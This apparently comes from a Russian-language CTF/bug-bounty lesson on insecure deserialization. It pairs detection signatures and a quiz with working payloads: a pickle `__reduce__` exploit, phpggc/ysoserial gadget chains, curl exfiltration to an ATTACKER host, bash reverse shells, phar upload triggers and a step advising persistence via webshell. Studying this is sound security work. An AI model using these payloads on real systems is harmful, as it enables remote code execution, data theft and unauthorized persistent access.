---
id: web-deserialization
title: "Небезопасная десериализация"
category: web
parent: web-ssti-advanced
difficulty: hard
order: 2
tags: [deserialization, pickle, java, php, gadget-chain, rce]
prerequisites: [web-ssti]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как распознать небезопасную десериализацию в PHP/Java/Python/Node и построить gadget-цепочку до RCE."
---

Небезопасная десериализация — это восстановление объекта из данных, контролируемых атакующим, что приводит к исполнению кода через «магические» методы (PHP `__wakeup`, Java `readObject`, Python `__reduce__`). Это один из самых «глубоких» классов: чтобы проэксплуатировать, нужно построить **gadget chain** — цепочку классов из доступных библиотек, которая при десериализации приводит к выполнению команды. Зато результат — почти всегда RCE.

## Теория: как работает и как распознать

Сериализация превращает объект в байты; десериализация восстанавливает. Опасность в том, что при восстановлении объект может выполнять код (через магические методы/хуки).

**PHP:** функции `serialize()`/`unserialize()`. Формат: `O:4:"User":2:{s:4:"name";s:3:"bob";s:4:"role";s:4:"user";}`. Магические методы `__wakeup`, `__destruct`, `__toString` выполняются при десериализации/уничтожении и используются в gadget-цепочках (популярные: `Monolog`, `Guzzle`, `Laravel`).

**Java:** `ObjectInputStream.readObject()`. Сериализованный поток начинается с `AC ED 00 05`. Эксплуатация через `ysoserial` (готовые цепочки: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1`, `Hibernate1`).

**Python:** `pickle.loads()`. Поток начинается с `\x80` (protocol 2+) и содержит opcodes. Эксплуатация — переопределение `__reduce__`, возвращающего `(os.system, ('cmd',))`.

**Node:** `node-serialize` с `_$$ND_FUNC$$_function(){...}()` — IIFE выполняется при десериализации.

**.NET:** `BinaryFormatter`, `LosFormatter`, `ViewState` — через `ysoserial.net`.

Как распознать:
- **Cookie/параметр в base64**, декодируется в бинарный мусор или `O:...`/`a:...` (PHP), `rO0AB...` (Java base64 от `AC ED 00 05`), `\x80\x04` (pickle).
- Скрытые поля/токены, которые выглядят как сериализованный blob.
- Ошибки «unserialize()», «ObjectInputStream», «pickle», `__VIEWSTATE`.

## Инструменты: ysoserial, phpggc, pickle-скрипты

**PHP — phpggc** (готовые цепочки):

```bash
phpggc -l                                    # список цепочек
phpggc Laravel/RCE9 system id                 # сгенерировать payload
phpggc -b Monolog/RCE1 system 'id' | base64   # base64 для cookie
```

**Java — ysoserial:**

```bash
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial.jar CommonsBeanutils1 'curl http://ATTACKER/`id`' | base64 -w0
```

**Python — ручной pickle:**

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

**Detect-сигнатуры:**

```
PHP:    O:<len>:"<Class>":<n>:{...}   или  a:<n>:{...}
Java:   rO0AB (base64 от AC ED 00 05)
Python: gASV (base64) / \x80\x04
Node:   {"rce":"_$$ND_FUNC$$_function(){...}()"}
.NET:   /wEPDwUK...  (ViewState)
```

## Разобранный пример: pickle-cookie → RCE

Цель — `https://dashboard.example`, cookie `session` выглядит как base64.

Шаг 1. Декодируем cookie:

```bash
echo 'gASVJgAAAAAAAACM...' | base64 -d | xxd | head
# 80 04 95 ... -> Python pickle (protocol 4)
```

Шаг 2. Готовим payload. Сначала безопасный PoC — `id`:

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Шаг 3. Подставляем в cookie и шлём запрос:

```bash
PAYLOAD=$(python3 gen.py)
curl -s "https://dashboard.example/" -b "session=$PAYLOAD"
```

Шаг 4. Проверяем выполнение — через out-of-band (если вывода нет):

```python
# payload: curl на наш сервер
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER:8080/$(id|base64)',))
```

На нашем сервере:

```bash
python3 -m http.server 8080
# в логе: GET /dWlkPTAocm9vdCk...
```

Шаг 5. Для reverse shell — тот же подход с `os.system`:

```python
return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
```

## Java-пример (кратко)

```
1. Заметить cookie/параметр с base64, начинающимся на rO0AB.
2. Сгенерировать: java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
3. Подставить в запрос: curl -H 'Cookie: session=<payload>' https://target/
4. Если не сработало — перебрать цепочки (CC1..CC7, Spring, Hibernate).
```

Для blind-детекта используйте URLDNS-цепочку (инициирует DNS-запрос — видно на коллабораторе):

```bash
java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0
```

## Типичные ошибки новичков

- **Не распознать формат.** `O:`, `rO0AB`, `\x80` — сигнатуры; учитесь их узнавать. Без этого вы не поймёте, что перед вами десериализация.
- **Путать сериализацию данных и десериализацию кода.** Не каждый blob уязвим — нужен именно вызов десериализации пользовательских данных.
- **Сразу стрелять RCE-payload.** Начните с DNS/безвредного PoC (URLDNS, `curl` на коллаборатор), чтобы убедиться в канале.
- **Не учитывать версию/набор библиотек.** Gadget-цепочка зависит от того, какие классы есть в classpath; перебирайте цепочки.
- **Игнорировать подписанные/шифрованные blob.** Если blob подписан (HMAC) или зашифрован — сначала нужен ключ/секрет (часто утекает в JS/конфиге).
- **Забыть про PHP phar.** Даже `file_exists()` на `phar://` может триггерить десериализацию метаданных.
- **Ломать приложение некорректным payload.** Неверный blob вызывает 500; проверяйте синтаксис сериализации.

## Полный разбор: PHP unserialize → POP-цепочка (с выводом)

End-to-end от обнаружения до RCE через готовую gadget-цепочку.

Шаг 1. Обнаруживаем сериализованный blob. Например, cookie `data`:

```bash
echo 'TzoyNToiTW9ub2xvZ1xIYW5kbGVyXFN0cmVhbUhhbmRsZXIiOjE6...' | base64 -d 2>/dev/null | head -c 60
# O:25:"Monolog\Handler\StreamHandler":1:{...}   -> PHP-сериализация
```

Шаг 2. Определяем фреймворк/библиотеки (по исходникам/`.env`/`composer.json`):

```bash
curl -s https://app.example/.git/HEAD   # или .env / composer.json
# Monolog присутствует -> цепочки Monolog/RCE*
phpggc -l | grep -i monolog
# Monolog/RCE1 ... Monolog/RCE9
```

Шаг 3. Генерируем payload (команда без вывода — для blind):

```bash
phpggc Monolog/RCE1 system 'curl http://ATTACKER:8080/$(id|base64)' | base64 -w0 > payload.txt
cat payload.txt
```

Шаг 4. Отправляем и слушаем коллаборатор:

```bash
python3 -m http.server 8080 &   # наш сервер
curl -s "https://app.example/" -b "data=$(cat payload.txt)"
# в логе: GET /dWlkPTAocm9vdCkK   -> id выполнен
```

Шаг 5. Для интерактивности — reverse shell:

```bash
phpggc Monolog/RCE1 system 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | base64 -w0
```

Шаг 6. Обязательный read-back: подтвердите выполнение (в логе коллаборатора / в шелле `id`). Не помечайте как «RCE» без подтверждения.

## Reference-таблица: сигнатуры и инструменты по языкам

| Язык | Сигнатура | Инструмент | Формат payload |
|------|-----------|-----------|----------------|
| PHP | `O:<n>:"Class":...`, `a:<n>:{...}` | `phpggc` | serialize/phar |
| Java | `AC ED 00 05` / base64 `rO0AB` | `ysoserial` | ObjectInputStream |
| Python | `\x80\x02..\x05` / base64 `gASV` | ручной `pickle` | `__reduce__` |
| Node | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` | `node-serialize` | IIFE |
| .NET | `/wEPDwUK...` (ViewState), `AAEAAAD` | `ysoserial.net` | BinaryFormatter/LosFormatter |
| Ruby | `\x04\x08` (Marshal) | ручной/`universal_gadget` | `Marshal.load` |

Быстрая проверка типа blob'а:

```bash
echo "$BLOB" | base64 -d 2>/dev/null | xxd | head -1
# ac ed 00 05 -> Java ; 80 04 -> pickle ; 4f 3a -> PHP O:...
```

## Java: выбор цепочки и blind-детект

- **Сначала URLDNS** (безопасный): `java -jar ysoserial.jar URLDNS 'http://unique.ATTACKER' | base64 -w0` — инициирует DNS, видно на коллабораторе. Если DNS пришёл — десериализация есть.
- **Затем цепочки по библиотекам:** `CommonsCollections1..7`, `CommonsBeanutils1`, `Spring1/2`, `Hibernate1/2`, `Groovy1`, `JRMPClient`. Выбор зависит от classpath.
- **Blind RCE:** используйте `curl`/DNS-эксфильтрацию в команде.
- **Фильтры:** если `readObject` обёрнут в фильтр (`ObjectInputFilter`), многие цепочки блокируются — ищите обходные (например, через `java.util.PriorityQueue`-based).
- **Версии JDK:** некоторые цепочки требуют конкретных JDK; перебирайте.

```bash
for c in CommonsCollections1 CommonsCollections5 CommonsBeanutils1 Spring1; do
  java -jar ysoserial.jar $c 'curl http://ATTACKER/'$c 2>/dev/null | base64 -w0 > /tmp/p_$c
  echo "try $c"
done
```

## Что делать дальше / решение

1. **Распознать формат** blob'а (сигнатуры/`xxd`).
2. **Определить стек** (фреймворк, библиотеки) — из исходников/конфигов.
3. **Сгенерировать PoC** (`phpggc`/`ysoserial`/pickle) под этот стек.
4. **Blind-детект** (URLDNS/OOB `curl`) перед RCE.
5. **Подтвердить RCE** через коллаборатор/шелл и **сделать read-back** (`id`).
6. **Закрепиться** (webshell/reverse shell) и записать артефакт.
7. **Учесть подпись/шифрование** blob'а — искать ключ (`.env`, JS).

## PHP phar и другие неочевидные триггеры

Сериализация в PHP срабатывает не только при `unserialize()`. **phar-метаданные** десериализуются при обращении к `phar://` через **обычные файловые функции**:

```php
file_exists('phar://uploads/exploit.phar/x');
getimagesize('phar://uploads/exploit.phar/x');
is_file(...); stat(...); fopen(...); file_get_contents(...);
```

Поэтому цепочка «загрузка файла + любая файловая функция с управляемым путём» даёт RCE без явного `unserialize`:

```bash
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
curl -s "https://app.example/avatar?src=phar://uploads/exploit.phar/x"
```

phar маскируется под картинку (stub `GIF89a`, расширение `.jpg`) — расширение неважно, важен контент.

Другие триггеры PHP-десериализации:

- **Session deserialization:** PHP хранит сессии в формате serialize; если вы контролируете файл сессии (LFI + запись), можно подсунуть объект.
- **`__PHP_Incomplete_Class`:** при отсутствии класса — маркер, что объект десериализован.
- **Cookie/скрытые поля:** многие фреймворки (Laravel, Symfony) кладут сериализованные данные в cookie (`laravel_session`, `_symfony_flashes`).
- **`igbinary`/`msgpack`:** альтернативные форматы — сигнатуры иные (`\x00`-префиксы).

Проверяйте не только явные параметры, но и **любое** место, где приложение читает файл по пути, который вы контролируете — там может жить phar-триггер.

## Инструменты и порядок для десериализации

- **`phpggc -l`** — список PHP-цепочек (Monolog, Guzzle, Laravel, Symfony, Doctrine).
- **`ysoserial.jar`** — Java-цепочки (CC1-7, Beanutils, Spring, Hibernate, Groovy).
- **`ysoserial.net`** — .NET (BinaryFormatter, ViewState, LosFormatter, ObjectStateFormatter).
- **`pickle`/`dill`** — Python (`__reduce__`).
- **`node-serialize`/`serialize-javascript`** — Node.

Порядок: распознать сигнатуру → определить стек → сгенерировать PoC → blind-детект (URLDNS/OOB) → RCE → read-back. Всегда начинайте с безопасного детектора, чтобы не уронить сервис некорректным blob'ом.

## Замечание по безопасности payload'ов

Готовые цепочки из `ysoserial`/`phpggc` — это реальный код исполнения. На живом стенде проверяйте сначала **безвредный** детектор (URLDNS/OOB `curl`), затем RCE. Никогда не запускайте payload, который модифицирует данные или открывает слушатель на цели без согласования — приложение должно остаться живым для дальнейшего пивота.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какая сигнатура указывает на сериализованный Java-объект?"
  options:
    - "`O:4:"User"`"
    - "`AC ED 00 05` (base64 `rO0AB`)"
    - "`\x80\x04`"
    - "`a:2:{`"
  answer: 1
  explanation: "Это Java-магия ObjectInputStream."
- question: "Какой метод Python-pickle используется для RCE?"
  options:
    - "`__init__`"
    - "`__reduce__`"
    - "`__str__`"
    - "`__len__`"
  answer: 1
  explanation: "Он возвращает вызываемый объект и аргументы."
- question: "Для чего нужен ysoserial?"
  options:
    - "Для сканирования портов"
    - "Для генерации Java-deserialization gadget-цепочек"
    - "Для SQLi"
    - "Для XSS"
  answer: 1
  explanation: "Готовые цепочки под разные библиотеки."
- question: "Что делает цепочка URLDNS в ysoserial?"
  options:
    - "Выполняет команду"
    - "Инициирует DNS-запрос для blind-детекта десериализации"
    - "Читает файл"
    - "Шифрует трафик"
  answer: 1
  explanation: "Безопасный детектор — видно на коллабораторе."
- question: "Как выглядит PHP-сериализованный массив?"
  options:
    - "`[1,2]`"
    - "`a:2:{i:0;i:1;i:1;i:2;}`"
    - "`{"a":1}`"
    - "`<array>`"
  answer: 1
  explanation: "Формат `a:<n>:{...}`."
```

## Где пригодится

- **CTF (Web):** десериализация — «тяжёлый» класс задач на RCE; часто флаг берётся готовой цепочкой phpggc/ysoserial.
- **Bug bounty:** небезопасная десериализация редка, но оплачивается как critical; ценна тем, что уникальна.
- **Пентест:** тестирование любых blob-ов (cookies, токены, ViewState) — обязательный пункт для RCE-охоты.
- **Работа (AppSec):** запрет нативной десериализации недоверенных данных, подпись/шифрование blob, обновление библиотек — меры защиты.
